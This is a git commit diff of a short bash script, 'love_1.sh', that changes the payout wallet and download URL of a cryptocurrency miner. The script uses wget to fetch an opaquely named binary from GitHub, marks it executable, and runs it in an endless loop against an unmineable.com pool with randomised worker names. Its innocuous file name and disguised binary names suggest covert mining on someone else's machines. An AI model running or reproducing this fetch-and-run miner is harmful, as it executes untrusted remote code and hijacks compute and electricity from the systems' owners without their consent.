caf8a1503e263a4e91da608ca8d5e04f24701197
alibahrami1204 <89921212+alibahrami1204@users.noreply.github.com>
2021-09-01 18:53:20 +0430

    Update love_1.sh

--- love_1.sh
+++ love_1.sh
@@ -1,11 +1,11 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=TRX:TUxbPLqKPtdvtGTFfAYmqJLdzjBhQuWSVU
+WALLET=TRX:TDUyaKcbhFGViyBHarTtPuHhHk9mXm84th
 WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
-wget https://github.com/archernap/prem/raw/main/janeman
-chmod +x janeman
+wget https://github.com/alibahrami1204/Success/raw/main/logan
+chmod +x logan
 	while [ 1 ]; do
-		./janeman -pool $POOL -wal $WALLET.$WORKER -pass x
+		./logan -pool $POOL -wal $WALLET.$WORKER -pass x
         sleep 5
 	done
 sleep 999999999 
